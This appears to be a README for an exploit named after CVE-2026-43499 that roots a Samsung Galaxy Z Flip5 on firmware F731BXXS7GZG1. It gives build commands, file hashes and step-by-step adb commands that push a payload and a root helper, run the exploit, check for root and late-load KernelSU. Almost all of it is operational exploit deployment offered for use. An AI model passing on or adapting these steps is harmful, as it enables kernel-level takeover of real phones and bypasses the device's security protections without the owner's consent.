# Samsung Galaxy Z Flip5 SM-F731B F731BXXS7GZG1 Profile

This profile is built for Galaxy Z Flip5 `SM-F731B` running firmware `F731BXXS7GZG1` and kernel `5.15.189-android13-8-33404244-abF731BXXS7GZG1`.

## Files

| File | SHA-256 |
| --- | --- |
| `cve-2026-43499-app.so` | `676f455f898c0a834451b78c7da38b2621940683f421d88b1e888288aa2c8b75` |
| `../../build/b5q-F731BXXS7GZG1/cve-2026-43499-root` | `4c50795558adbb13de03b8e02e753d488d40188af18e77a5e0395f62360826b4` |
| `../../kernelsu/android13-5.15.189_kernelsu-b5q-F731BXXS7GZG1.ko` | `2fc709db2a84657e9d1962610d9b199ea50f7256f7b1ec06e2e6fe5cdc994ae2` |
| `../../kernelsu/ksud-b5q-F731BXXS7GZG1-kdp` | `bf1749d89852d33ee58dde38dbf20a9232b46c510d4e09a37234bad9094bdafd` |

## Build

```sh
make TARGET=b5q-F731BXXS7GZG1 ANDROID_NDK_HOME=/path/to/android-ndk
```

Outputs:
```text
build/b5q-F731BXXS7GZG1/cve-2026-43499-app.so
build/b5q-F731BXXS7GZG1/cve-2026-43499-root
```

## ADB Shell Deployment & Verification

1. Push the payload and helper binary:

```cmd
adb push build/b5q-F731BXXS7GZG1/cve-2026-43499-app.so /data/local/tmp/b5q.so
adb push build/b5q-F731BXXS7GZG1/cve-2026-43499-root /data/local/tmp/cve-2026-43499-root
adb shell "chmod 755 /data/local/tmp/cve-2026-43499-root"
adb shell "sha256sum /data/local/tmp/b5q.so /data/local/tmp/cve-2026-43499-root"
```

2. Execute payload runner:

```cmd
adb shell "SLIDE_SOURCE=tracefs EXPLOIT_ATTEMPTS=1 P0_ATTEMPT_TIMEOUT_SEC=115 EXPLOIT_ATTEMPT_TIMEOUT_SEC=600 /data/local/tmp/cve-2026-43499-root --run-payload /data/local/tmp/b5q.so /data/local/tmp/cve-2026-43499-root /data/local/tmp/b5q-fzg1-mcast.log"
```

3. Check root daemon status:

```cmd
adb shell "/data/local/tmp/cve-2026-43499-root -c 'id; whoami; getenforce'"
```

4. KernelSU late-load:

```cmd
adb push kernelsu/ksud-b5q-F731BXXS7GZG1-kdp /data/local/tmp/ksud-s25u-kdp
adb shell "chmod 755 /data/local/tmp/ksud-s25u-kdp"
adb shell "/data/local/tmp/cve-2026-43499-root -c 'cp /data/local/tmp/ksud-s25u-kdp /data/local/tmp/.ksud-stage; chmod 755 /data/local/tmp/.ksud-stage'"
adb shell "/data/local/tmp/cve-2026-43499-root --late-load"
```
